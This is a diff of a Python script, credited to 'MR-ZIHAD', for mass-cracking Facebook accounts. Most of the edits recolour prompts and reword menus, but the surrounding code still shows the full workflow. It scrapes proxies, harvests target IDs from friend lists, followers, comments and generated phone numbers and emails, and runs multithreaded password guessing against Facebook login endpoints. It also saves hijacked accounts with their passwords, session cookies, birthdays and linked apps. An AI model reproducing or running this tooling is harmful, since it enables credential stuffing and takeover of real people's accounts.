@@ -29,28 +29,28 @@ except ImportError:
 ###---[ANGGAP INI LOGO ]---###
 def logo():
 	return str(f"""  
- _____  ___    _______  ___  ___  ___________  
+{hh}_____  ___    _______  ___  ___  ___________  
 (\"   \|"  \  /"     "||"  \/"  |("     _   ") 
 |.\\   \    |(: ______) \   \  /  )__/  \\__/  
 |: \.   \\  | \/    |    \\  \/      \\_ /     
 |.  \    \. | // ___)_   /\.  \      |.  |     
 |    \    \ |(:      "| /  \   \     \:  |     
- \___|\____\) \_______)|___/\___|     \__|     
-  SCRIPT BY {kk}MR-ZIHAD{P}, VERSION {kk}PREMIUM{P} LIMITED USER""")
+ \___|\____\) \_______)|___/\___|     \__|{P}     
+  {hh}SCRIPT BY{P} {kk}MR-ZIHAD{P}, {hh}VERSION{P} {kk}PREMIUM{P}""")
 ###---[ USER BARU ]---###
 def newbie():
-	nama = input(f'{logo()}\n\n [{hh}<{P}] WELCOME BRO, WHATS YOUR NAME\n NAME :{kk} ');open('.nama.json','w').write(nama)
-	input(f' {P}hallo {kk}{nama}{P}, THIS IS A PREMIUM SCRIPT\n LIMITED EDITION PLEASE USE AND\n DONT SELL IT, THANK YOU\n PLEASE ENTER THAN LOGIN OPTION')
+	nama = input(f'{logo()}\n\n [{hh}<{P}] {hh}WELCOME BRO, WHATS YOUR NAME{P}\n {hh}NAME{P} :{kk} ');open('.nama.json','w').write(nama)
+	input(f' {P}hallo {kk}{nama}{P}, {hh}THIS IS A PREMIUM SCRIPT{P}\n {hh}LIMITED EDITION PLEASE USE AND{P}\n {hh}DONT SELL IT, THANK YOU{P}\n {hh}PLEASE ENTER THAN LOGIN OPTION{P}')
 	
 
 ###---[ INFOMASI USER ]---###
 def prem_():
-	try:open('.cookie.txt','r').read();co='aktif'
+	try:open('.cookie.txt','r').read();co='ACTIVE'
 	except IOError:co='NO'
 	try:n=open('.nama.json','r').read()
 	except IOError:newbie()
 	string = '─────────────────────────────'
-	user = (f' {string}\n [{hh}>{P}] NAME : {hh}{n.lower()}{P}\n [{hh}>{P}] COOKIE : {hh}{co}{P}\n [{hh}>{P}] LIMIT : {hh}UNLIMITED{P}\n {string}')
+	user = (f' {string}\n [{hh}>{P}] {hh}NAME{P} : {hh}{n.lower()}{P}\n [{hh}>{P}] {hh}COOKIE{P} : {hh}{co}{P}\n [{hh}>{P}] {hh}LIMIT{P} : {hh}UNLIMITED{P}\n {string}')
 	return str(user)
 	
 	
@@ -100,7 +100,7 @@ def back():
 try:
 	clear_layar()
 	print(logo())
-	print(f'\r\n [{hh}>{P}] DUMPING PROXY AND CREATING USERAGENT')
+	print(f'\r\n [{hh}>{P}] {hh}DUMPING PROXY AND CREATING USERAGENT{P}')
 	try:os.remove('.proxy.txt')
 	except:pass
 	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
@@ -149,8 +149,8 @@ def pilih_login():
 	except:pass
 	clear_layar()
 	print(logo())
-	print(f"\n [{hh}1{P}] LOGIN MENU '{hh}YES{P}' ")
-	print(f" [{hh}2{P}] LOGIN MENU '{kk}NO{P}'")
+	print(f"\n [{hh}1{P}] {hh}LOGIN MENU{P} '{hh}YES{P}' ")
+	print(f" [{hh}2{P}] {hh}LOGIN MENU{P} '{kk}NO{P}'")
 	print(f" [{hh}3{P}] EXIT")
 	ask = input(' menu : ')
 	if ask in ['1','01']:open('.menu_login.json','w').write('login')
@@ -178,7 +178,7 @@ def get_data():
 def login():
 	try:os.remove('.cookie.txt')
 	except:pass
-	cookie = input(f" [{hh}<{P}] DON'T USE PARSONAL ACCOUNT '{kk}NO{P}' NO LOGIN\n COOKIE : ")
+	cookie = input(f" [{hh}<{P}] {hh}DON'T USE YOUR PARSONAL ACCOUNT{P} {kk}NOW{P} {hh}LOGIN{P}\n {hh}COOKIE{P} : ")
 	if cookie in ['no','No','NO']:
 		open('.menu_login.json','w').write('no');clear_layar();no_login()
 	url = "https://business.facebook.com/business_locations"
@@ -199,63 +199,61 @@ def no_login():
 	clear_layar()
 	try:n=open('.nama.json','r').read()
 	except:newbie()
-	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] WELCOME {kk}{n}{P}, SELECT MENU')
-	print(f" [{hh}1{P}] FILE CRACK")
-	print(f" [{hh}2{P}] SEARCH CRACK")
-	print(f" [{hh}3{P}] COMMENT CRACK")
-	print(f" [{hh}4{P}] EMAIL CRACK")
-	print(f" [{hh}5{P}] NUMBER CRACK")
-	print(f" [{hh}6{P}] CRACK RESULT")
-	print(f" [{hh}7{P}] CHANGE LOGIN OPTION")
+	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] {hh}WELCOME{P} {kk}{n}{P}, {hh}SELECT MENU{P}')
+	print(f" [{hh}1{P}] {hh}FILE CRACK{P}")
+	print(f" [{hh}2{P}] {hh}COMMENT CRACK{P}")
+	print(f" [{hh}3{P}] {hh}EMAIL CRACK{P}")
+	print(f" [{hh}4{P}] {hh}NUMBER CRACK{P}")
+	print(f" [{hh}5{P}] {hh}CRACK RESULT{P}")
+	print(f" [{hh}6{P}] {hh}CHANGE LOGIN OPTION{P}")
 	ask = input(f" menu : ")
 	if ask in ['1','01']:crack_file()
-	elif ask in ['2','02']:crack_search()
-	elif ask in ['3','03']:crack_komen()
-	elif ask in ['4','04']:clon_email()
-	elif ask in ['5','05']:crack_nomor()
-	elif ask in ['6','06']:cek_hasil()
-	elif ask in ['7','07']:pilih_login()
-	else:sys.exit(f" [{M}>{P}] CORRECT")
+	elif ask in ['2','02']:crack_komen()
+	elif ask in ['3','03']:clon_email()
+	elif ask in ['4','04']:crack_nomor()
+	elif ask in ['5','05']:cek_hasil()
+	elif ask in ['6','06']:pilih_login()
+	else:sys.exit(f" [{M}>{P}] NOT FOUND")
 
 	
 ###---[ MENU LOGIN ]---###
 def ya_login(n,t,c):
 	clear_layar()
 	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] WALLCOME {kk}{n}{P}, SELECT MENU')
-	print(f" [{hh}1{P}] CRACK PUBLIC")
-	print(f" [{hh}2{P}] CRACK FOLLOWER")
-	print(f" [{hh}3{P}] CHECK ACCOUNT RESULTS")
-	print(f" [{hh}4{P}] CHANGE LOGIN FEATURE")
+	print(f" [{hh}1{P}] {hh}CRACK PUBLIC{P}")
+	print(f" [{hh}2{P}] {hh}CRACK FOLLOWER{P}")
+	print(f" [{hh}3{P}] {hh}CHECK ACCOUNT RESULTS{P}")
+	print(f" [{hh}4{P}] {hh}CHANGE LOGIN OPTION{P}")
 	ask = input(f" menu : ")
 	if ask in ['1','01']:crack_publik(t,c)
 	elif ask in ['2','02']:crack_foll(t,c)
 	elif ask in ['3','03']:cek_hasil()
 	elif ask in ['4','04']:pilih_login()
 	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] CORRECT")
-	else:sys.exit(f" [{M}>{P}] CORRECT")
+	else:sys.exit(f" [{M}>{P}] NOT FOUND")
 		
 
 ###---[CEK HASIL CRACK ]---###
 def cek_hasil():
 	no,nom = 0,[]
-	one = input(f' [{hh}1{P}] CHECK ACCOUNT RESULTS OK\n [{hh}2{P}] CHECK ACCOUNT RESULTS CP\n MENU : ')
+	one = input(f' [{hh}1{P}] {hh}CHECK ACCOUNT RESULTS OK{P}\n [{hh}2{P}] {hh}CHECK ACCOUNT RESULTS CP{P}\n {hh}MENU{P} : ')
 	if one in ['1','01']:
 		try:ok = os.listdir('OK')
-		except:sys.exit(f" [{M}>{P}] NO RESULTS ok")
+		except:sys.exit(f" [{M}>{P}] {hh}NO RESULTS {hh}OK{P}")
 		for x in ok:
 			nom.append(x)
 			no+=1
 			try:jum= open('OK/'+x,'r').readlines()
 			except:continue
 			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
-		abc = input(f' [{hh}<{P}] FILE NUMBER : ')
+		abc = input(f' [{hh}<{P}] {hh}FILE NUMBER{P} : ')
 		file = nom[int(abc)-1]
 		try:buka = open('OK/'+file,'r').read()
-		except:sys.exit(f" [{M}>{P}] FILE NO RESULT")
+		except:sys.exit(f" [{M}>{P}] {hh}FILE NO RESULT{P}")
 		print(hh+buka+P)
 	elif one in ['2','02']:
 		try:ok = os.listdir('CP')
-		except:sys.exit(f" [{M}>{P}] NO RESULT CP")
+		except:sys.exit(f" [{M}>{P}] {hh}NO RESULT CP{P}")
 		for x in ok:
 			nom.append(x)
 			no+=1
@@ -265,18 +263,18 @@ def cek_hasil():
 		abc = input(f' [{hh}<{P}] FILE : ')
 		file = nom[int(abc)-1]
 		try:buka = open('CP/'+file,'r').read()
-		except:sys.exit(f" [{M}>{P}] FILE NO RESULT cp")
+		except:sys.exit(f" [{M}>{P}] {hh}FILE NO RESULT CP{P}")
 		print(kk+buka+P)
-	else:sys.exit(f" [{M}>{P}] CORRECT")
+	else:sys.exit(f" [{M}>{P}] NOT FOUND")
 		
 		
 ###---[ DUMP NO LOGIN ]---###
 def crack_nomor():
-	print(f' [{hh}<{P}] CRACK MENUAL PASSWORD')
-	depan = input(' awalan : ')
+	print(f' [{hh}<{P}] {hh}CHOOSE NUMBER CODE{P}')
+	depan = input(' {hh}ENTER{P} : ')
 	if len(depan)==3:pass
-	else:exit(f' [{M}>{P}] EXAMPLE : 089')
-	jumla = input(' jumlah : ')
+	else:exit(f' [{M}>{P}] EXAMPLE : 089,0303,017')
+	jumla = input(' LIMIT : ')
 	for x in range(int(jumla)):
 		rr = random.randint
 		A = depan
@@ -297,13 +295,13 @@ def clon_email():
 	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	print(f' [{hh}>{P}] DUMP EMAIL, MAX 5000 ID')
-	nama = input(' target : ')
+	print(f' [{hh}>{P}] {hh}DUMP EMAIL, MAX 5000 ID{P}')
+	nama = input(' PASSWORD : ')
 	if ',' in str(nama):
-		exit(f' [{M}<{P}] ENTER NAME')
-	doma = input(' domain : ')
+		exit(f' [{M}<{P}] {hh}ENTER NAME{P}')
+	doma = input(' {hh}DOMAIN{P} : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		exit(f' [{M}<{P}] ENTER CORRECT DOMAIN')
+		exit(f' [{M}<{P}] {hh}ENTER CORRECT DOMAIN{P}')
 	jumlah = input(' total  : ')
 	for xyz in range(int(jumlah)):
 		A = nama
@@ -317,17 +315,17 @@ def clon_email():
 	atur_atur()	
 
 def crack_file():
-	file = input(f' [{hh}<{P}] ENTER DUMP FILE\n FILE : ')
+	file = input(f' [{hh}<{P}] {hh}ENTER DUMP FILE{P}\n {hh}FILE{P} : ')
 	try:
 		uuid = open(file,'r').readlines()
 		for data in uuid:
 			try:user,nama = data.split('|')
-			except:exit(f" [{M}>{P}] WORNG SEPARETOR")
+			except:exit(f" [{M}>{P}] {hh}WORNG SEPARETOR{P}")
 			dump.append(data)
 			print('\r sedang dump %s id'%(len(dump)),end=" ")
 			sleep(0.0000003)
-	except FileNotFoundError:exit(f" [{M}>{P}] FILE NOT FOUND")
-	print(f'\r [{hh}<{P}] TOTAL ACCOUNT {len(dump)}')
+	except FileNotFoundError:exit(f" [{M}>{P}] {hh}FILE NOT FOUND{P}")
+	print(f'\r [{hh}<{P}] {hh}TOTAL ACCOUNT{P} {len(dump)}')
 	atur_atur()
 	
 def crack_search():
@@ -370,12 +368,12 @@ def cari_nama(link):
 	
 
 def crack_komen():
-	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
+	ide = input(f' [{hh}<{P}] {hh}ENTER TARGET POST ID{P}\n {hh}ENTER{P} : ')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [{M}>{P}] FAILED DUMP COMMENT')
+		exit(f' [{M}>{P}] {hh}FAILED DUMP COMMENT{P}')
 	atur_atur()
 
 def get_komen(url):
@@ -397,7 +395,7 @@ def get_komen(url):
 	
 ###---[ DUMP LOGIN ]---###
 def crack_publik(t,c):
-	akun = input(f' [{hh}<{P}] SURE PUBLIC ACCOUNT \n ACCOUNT : ')
+	akun = input(f' [{hh}<{P}] {hh}SURE PUBLIC ACCOUNT{P} \n {hh}ENTER{P} : ')
 	try:
 		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
 		for pi in bas['friends']['data']:
@@ -410,18 +408,18 @@ def crack_publik(t,c):
 			except:continue
 		atur_atur()
 	except (KeyError,IOError):
-		exit(f" [{M}>{P}] UNPUBLIC ACCOUNT")	
+		exit(f" [{M}>{P}] {hh}UNPUBLIC ACCOUNT{P}")	
 
 
 def crack_masal(t,c):
-    print(f' [{hh}<{P}] SURE PUBLIC ACCOUNT ')
+    print(f' [{hh}<{P}] {hh}SURE PUBLIC ACCOUNT{P} ')
     try:
         bz=0
-        apa = int(input(f' NUMBER ID : '))
+        apa = int(input(f' {hh}NUMBER ID{P} : '))
     except:apa=1
     for bz in range(apa):
     	bz +=1
-    	akun = input(f'\r ENTER ACCOUNT {bz} : ')
+    	akun = input(f'\r {hh}ENTER ACCOUNT{P} {bz} : ')
     	try:
     		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
     		for pi in bas['friends']['data']:
@@ -431,13 +429,13 @@ def crack_masal(t,c):
     		      sys.stdout.flush()
     		      time.sleep(0.0002)
     	except:
-    		print(f"\r [{kk}!{P}] UNPUBLIC ACCOUNT       ")
+    		print(f"\r [{kk}!{P}] {hh}UNPUBLIC ACCOUNT{P}       ")
     		continue	                       		
     atur_atur()
     
     
 def crack_foll(t,c):
-	akun = input(f' [{hh}<{P}] SURE PUBLIC ACCOUNT \n ACCOUNT : ')
+	akun = input(f' [{hh}<{P}] {hh}ENTER PUBLIC ACCOUNT{P} \n {hh}ENTER{P} : ')
 	try:
 		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
 		for pi in bas["subscribers"]["data"]:
@@ -450,20 +448,20 @@ def crack_foll(t,c):
 			except:continue
 		atur_atur()
 	except (KeyError,IOError):
-		exit(f" [{M}>{P}] UNPUBLIC ACCOUNT")	
+		exit(f" [{M}>{P}] {hh}UNPUBLIC ACCOUNT{P}")	
 		
 		
 ###---[ ATUR SEBELUM CRACK ]---###
 akunok = []
 def atur_atur():
 	print(f"\r{P} ───────────────────────────────")
-	ro = input(f' [{hh}1{P}] MOBILE [{hh}2{P}] MBASIC [{hh}3{P}] FREE\n ENTER : ')
+	ro = input(f' [{hh}1{P}] {hh}MOBILE{P} [{hh}2{P}] {hh}MBASIC{P} [{hh}3{P}] {hh}FREE{P}\n {hh}ENTER{P} : ')
 	if ro in ['1','01']:metode.append('mobile')
 	elif ro in ['2','02']:metode.append('mbasic')
 	elif ro in ['3','03']:metode.append('free')
 	else:metode.append('mobile')
 	print(f"{P} ───────────────────────────────")
-	ch = input(f' [{hh}1{P}] OLDEST [{hh}2{P}] NEWEST [{hh}3{P}] RANDOM\n ENTER : ')
+	ch = input(f' [{hh}1{P}] {hh}OLDEST{P} [{hh}2{P}] {hh}NEWEST{P} [{hh}3{P}] {hh}RANDOM{P}\n {hh}ENTER{P} : ')
 	if ch in ['1','01']:
 		for x in dump:
 			id.append(x)
@@ -478,15 +476,15 @@ def atur_atur():
 		for x in dump:
 			id.append(x)
 	print(f"{P} ─────────────────────────────")
-	cp = input(f' [{hh}!{P}] ACCOUNT SESSION [YES/NO]\n pilih  : ')
+	cp = input(f' [{hh}!{P}] {hh}ACCOUNT SESSION{P} [{hh}YES/NO{P}]\n {hh}CHOOSE{P}  : ')
 	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
 		cepeh.append('ya')
 	print(f"{P} ─────────────────────────────")
-	apk = input(f' [{hh}!{P}] APP INFO [YES/NO]\n pilih  : ')
+	apk = input(f' [{hh}!{P}] {hh}APP INFO [YES/NO]{P}\n {hh}CHOOSE{P}  : ')
 	if apk in ['y','Ya','ya','1']:akunok.append('apk')
 	else:akunok.append('coki')
 	print(f"{P} ─────────────────────────────")
-	ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] AUTO & MANUAL [{hh}3{P}] AUTO\n PASSWORD  : ')
+	ch = input(f' [{hh}1{P}] {hh}MANUAL{P} [{hh}2{P}] {hh}AUTO & MANUAL{P} [{hh}3{P}] {hh}AUTO{P}\n {hh}CHOOSE{P}  : ')
 	if ch in ['1','01']:manual()
 	elif ch in ['2','2']:gabung()
 	elif ch in ['3','03']:otomatis()
@@ -498,11 +496,11 @@ def manual():
 	global ok,cp
 	pwx = []
 	print(f"{P} ─────────────────────────────")
-	B = input(f' [{hh}>{P}] INPUT 6 PASSWORD\n PASSWORD  : ').split(',')
+	B = input(f' [{hh}>{P}] {hh}INPUT 6 PASSWORD{P}\n {hh}PASSWORD{P}  : ').split(',')
 	for x in B:
 		pwx.append(x)
 	print(f"{P} ─────────────────────────────")
-	print(f' OK ACCOUNT : {sim_ok}\n CP ACCOUNT : {sim_cp}')
+	print(f' {hh}OK ACCOUNT{P} : {sim_ok}\n {hh}CP ACCOUNT{P} : {sim_cp}')
 	print(f"{P} ─────────────────────────────")
 	awal = datetime.now()
 	with tred(max_workers=30) as babas:
@@ -517,7 +515,7 @@ def manual():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] CRACK COMPLETE OK:{ok} AMOUNT CP:{cp} ')
+	exit(f'\r [{hh}<{P}] {hh}CRACK COMPLETE OK{P}:{ok} {hh}AMOUNT CP{hh}:{cp} ')
 
 
 def gabung():
@@ -525,12 +523,12 @@ def gabung():
 	pwx = []
 	A = ["123456"]
 	print(f"{P} ─────────────────────────────")
-	B = input(f' [{hh}>{P}] INPUT 6 PASSWORD\n PASSWORD  : ').split(',')
-	C = input(f' [{hh}>{P}] INPUT LAST NAME PASSWORD\n PASSWORD  : ')
+	B = input(f' [{hh}>{P}] {hh}INPUT 6 PASSWORD{P}\n {hh}PASSWORD{P}  : ').split(',')
+	C = input(f' [{hh}>{P}] {hh}INPUT LAST NAME PASSWORD{P}\n {hh}PASSWORD{P}  : ')
 	if ',' in str(C):
-		exit(f" [{M}>{P}] JUST BEHIND SINGLE PASSWORD")
+		exit(f" [{M}>{P}] {hh}JUST BEHIND SINGLE PASSWORD{P}")
 	print(f"{P} ─────────────────────────────")
-	print(f' OK ACCOUNT : {sim_ok}\n CP ACCOUNT : {sim_cp}')
+	print(f' {hh}OK ACCOUNT{P} : {sim_ok}\n {hh}CP ACCOUNT{P} : {sim_cp}')
 	print(f"{P} ─────────────────────────────")
 	awal = datetime.now()
 	with tred(max_workers=30) as babas:
@@ -572,13 +570,13 @@ def gabung():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] CRACK COMPLETE OK:{ok} ID CP:{cp} ')
+	exit(f'\r [{hh}<{P}] {hh}CRACK COMPLETE OK{P}:{ok} {hh}CP ID{P}:{cp} ')
 				
 
 def otomatis():
 	global ok,cp
 	print(f"{P} ─────────────────────────────")
-	print(f' OK ACCOUNT : {sim_ok}\n CP ACCOUNT : {sim_cp}')
+	print(f' {hh}OK ACCOUNT{P} : {sim_ok}\n {hh}CP ACCOUNT{P} : {sim_cp}')
 	print(f"{P} ─────────────────────────────")
 	awal = datetime.now()
 	with tred(max_workers=30) as babas:
@@ -624,7 +622,7 @@ def otomatis():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] CRACK COMPLETE  OK:{ok} ID CP:{cp} ')
+	exit(f'\r [{hh}<{P}] {hh}CRACK COMPLETE  OK{P}:{ok} {hh}CP ID{P} :{cp} ')
 				
 
 ###---[ MENU CRACK ]---###
@@ -674,12 +672,12 @@ def crack(idf,pwx,url,awal):
 							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
 							m, d, y = ttl.split('/')
 							m = tete[m]
-							print(f'\r [{kk}>{P}] NUMBER  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}          {P}\n [{kk}>{P}] BORN  : {kk}{d} {m} {y}{P}           \n')
+							print(f'\r [{kk}>{P}] NUMBER  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD : {kk}{pw}          {P}\n [{kk}>{P}] BORN  : {kk}{d} {m} {y}{P}           \n')
 							sapi = f'{idf}|{pw}|{d} {m} {y}'
 							open('CP/'+sim_cp,'a').write(sapi+'\n')
 							break
 						except:
-							print(f'\r [{kk}>{P}] NUMBER  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}          {P}\n')
+							print(f'\r [{kk}>{P}] {hh}NUMBER{P}  : {kk}{idf}{P}          \n [{kk}>{P}] {hh}PASSWORD{P} : {kk}{pw}          {P}\n')
 							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
 							break
 					else:
@@ -694,7 +692,7 @@ def crack(idf,pwx,url,awal):
 					ok+=1
 					open('OK/'+sim_ok,'a').write(data+'\n')
 					if "coki" in akunok:
-						print(f'\r [{hh}>{P}] NUMBER  : {hh}{idf}{P}          \n [{hh}>{P}] PASSWORD  : {hh}{pw}          {P}\n [{hh}>{P}] COOKIE : {hh}{kuki}{P}\n')
+						print(f'\r [{hh}>{P}] {hh}NUMBER{P}  : {hh}{idf}{P}          \n [{hh}>{P}] {hh}PASSWORD{P} : {hh}{pw}          {P}\n [{hh}>{P}] {hh}COOKIE{P} : {hh}{kuki}{P}\n')
 						break
 					elif "apk" in akunok:
 						cek_apk(idf,pw,kuki)
@@ -730,7 +728,7 @@ apk1, apk2, apk3 = [], [], []
 def cek_apk(idf,pw,kuki):
 	cookie = {"cookie" : kuki}
 	language(cookie)
-	akun = (f' [{hh}>{P}] NUMBER  : {hh}{idf}{P}          \n [{hh}>{P}] PASSWORD  : {hh}{pw}          {P}\n [{hh}>{P}] COOKIE : {hh}{kuki}{P}')
+	akun = (f' [{hh}>{P}] {hh}NUMBER{P}  : {hh}{idf}{P}          \n [{hh}>{P}] {hh}PASSWORD{P}  : {hh}{pw}          {P}\n [{hh}>{P}] {hh}COOKIE{P} : {hh}{kuki}{P}')
 	try:		
 		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
 		get_active(url,cookie)
@@ -746,7 +744,7 @@ def cek_apk(idf,pw,kuki):
 	print('\r'+akun)
 	if len(apk1)==0:pass
 	else:
-		akun = (f' [{hh}>{P}] APP ADDED :                     ')
+		akun = (f' [{hh}>{P}] {hh}APP ADDED{P} :                     ')
 		no = 0
 		for apk in apk1:
 			no += 1
@@ -754,7 +752,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk2)==0:pass
 	else:
-		akun = (f' {P}[{kk}>{P}] EXPIRED APPS :                   ')
+		akun = (f' {P}[{kk}>{P}] {hh}EXPIRED APPS{P} :                   ')
 		no = 0
 		for apk in apk2:
 			no += 1
@@ -762,7 +760,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk3)==0:pass
 	else:
-		akun = (f' {P}[{M}>{P}] DELETED APP :                  ')
+		akun = (f' {P}[{M}>{P}] {hh}DELETED APP{P} :                  ')
 		no = 0
 		for apk in apk3:
 			no += 1
